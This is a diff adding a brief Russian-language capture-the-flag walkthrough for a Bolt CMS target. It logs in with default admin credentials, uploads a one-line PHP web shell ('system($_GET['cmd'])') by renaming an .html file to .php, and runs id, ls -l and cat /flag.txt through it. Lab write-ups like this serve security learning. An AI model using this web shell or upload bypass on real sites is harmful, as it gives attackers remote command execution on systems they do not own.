@@ -1,0 +1,9 @@
+введем в ссылку следущее {link}/bolt 
+дальше введем логин и пароль admin password
+создадим файл куда с расширением .html туда впишем следущее:
+<?php echo system($_GET['cmd']);?>
+загрузим на сайт, послтзменим расширение на .php и кликнем
+дальше введем в ссылку след {link}/files/rce.php?cmd=id
+дальше {link}/files/rce.php?cmd=ls -l
+дальше {link}/files/rce.php?cmd=cat /flag.txt
+и получим флаг 
